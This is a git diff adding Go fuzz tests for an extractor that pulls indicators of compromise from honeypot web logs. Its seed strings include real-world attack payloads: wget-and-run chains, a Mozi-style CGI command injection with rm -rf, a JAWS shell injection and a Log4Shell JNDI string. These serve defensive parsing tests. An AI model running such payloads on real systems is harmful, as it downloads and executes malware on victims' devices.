@@ -35,6 +35,10 @@ func FuzzExtract(f *testing.F) {
 		"hxxp://evil[.]com/x.sh hxxps://c2[dot]bad[dot]org",
 		"connect 1[.]2[.]3[.]4 [at] [dot] [://] [:]",
 		"hxxxxxxp://[.][.][.] dot dot dot",
+		"cd /tmp;wget http://198.51.100.7/a;chmod +x a&&./a|sh",
+		"wget${IFS}http://198.51.100.7/b${IFS}-O-;curl http://;id",
+		"wget http://198.51.100.7/0123456789abcdef0123456789abcdef/x echo fedcba9876543210fedcba9876543210",
+		"curl -s http://ipinfo.io/ip; curl http://ipinfo.io.evil.example/",
 	}
 	for _, s := range seeds {
 		f.Add(s)
@@ -86,6 +90,15 @@ func FuzzExtract(f *testing.F) {
 				// punctuation, which would defeat de-duplication.
 				if strings.ContainsAny(ioc.Value[len(ioc.Value)-1:], urlTrailingCutset) {
 					t.Errorf("URL IOC %q ends with trailing shell punctuation", ioc.Value)
+				}
+				// Nor run on past a shell separator, nor lack a host.
+				for _, stop := range urlShellStops {
+					if strings.Contains(ioc.Value, stop) {
+						t.Errorf("URL IOC %q runs past shell separator %q", ioc.Value, stop)
+					}
+				}
+				if urlHost(ioc.Value) == "" {
+					t.Errorf("URL IOC %q has no host", ioc.Value)
 				}
 			case IOCTypeDomain:
 				// A domain IOC must not carry a scheme or a path separator.
@@ -162,6 +175,55 @@ func FuzzURLHost(f *testing.F) {
 		if ip := net.ParseIP(host); ip != nil && ip.To4() != nil && !strings.Contains(host, ":") {
 			if v4, numeric := looseIPv4(host); !numeric || v4 != ip.To4().String() {
 				t.Fatalf("looseIPv4(%q) = %q, %v; net.ParseIP says %s", host, v4, numeric, ip)
+			}
+		}
+	})
+}
+
+// FuzzExtractPayload feeds arbitrary web request targets and request lines
+// (as tanner, go-pot or log4pot store them) to the extractor. Decoding the
+// target must never panic, never yield a URL without a host or one that runs
+// past a shell separator, and stay linear on hostile input.
+func FuzzExtractPayload(f *testing.F) {
+	for _, s := range []string{
+		"/setup.cgi?todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://198.51.100.7/Mozi.m+-O+/tmp/n;sh+n",
+		"/shell?cd%20/tmp;wget%20http://198.51.100.7/jaws;sh%20/tmp/jaws",
+		"/index.php?u=http%3A%2F%2F198.51.100.7%2Fa.sh&x=%",
+		"GET /?x=${jndi:ldap://198.51.100.7/a} HTTP/1.1",
+		"GET /cgi-bin/x?c=wget%20http://198.51.100.7/c.sh HTTP/1.1\r\nHost: a",
+		"http://198.51.100.7/a+b.sh", "/%", "/%2", "/%zz?+%%", "/?" + strings.Repeat("%2", 3000),
+		"/" + strings.Repeat("http://a.example/;", 400), "GET " + strings.Repeat("/", 5000),
+	} {
+		f.Add(s)
+	}
+	e := NewExtractor()
+	f.Fuzz(func(t *testing.T, payload string) {
+		ev := &database.Event{Honeypot: "tanner", EventType: "tanner.http.get", Protocol: "http",
+			SourceIP: "203.0.113.7", Payload: []byte(payload), Timestamp: time.Now().UTC()}
+		start := time.Now()
+		iocs := e.Extract(ev)
+		if d := time.Since(start); d > time.Second {
+			t.Fatalf("Extract took %v on a %d-byte payload", d, len(payload))
+		}
+		for _, ioc := range iocs {
+			switch ioc.Type {
+			case IOCTypeURL:
+				if urlHost(ioc.Value) == "" || strings.IndexFunc(ioc.Value, unicode.IsSpace) >= 0 {
+					t.Errorf("URL IOC %q", ioc.Value)
+				}
+				for _, stop := range urlShellStops {
+					if strings.Contains(ioc.Value, stop) {
+						t.Errorf("URL IOC %q runs past %q", ioc.Value, stop)
+					}
+				}
+			case IOCTypeIP:
+				if net.ParseIP(ioc.Value) == nil || isPrivateIP(ioc.Value) {
+					t.Errorf("IP IOC %q", ioc.Value)
+				}
+			case IOCTypeDomain:
+				if !reHostname.MatchString(ioc.Value) || isIPEchoHost(ioc.Value) {
+					t.Errorf("domain IOC %q", ioc.Value)
+				}
 			}
 		}
 	})
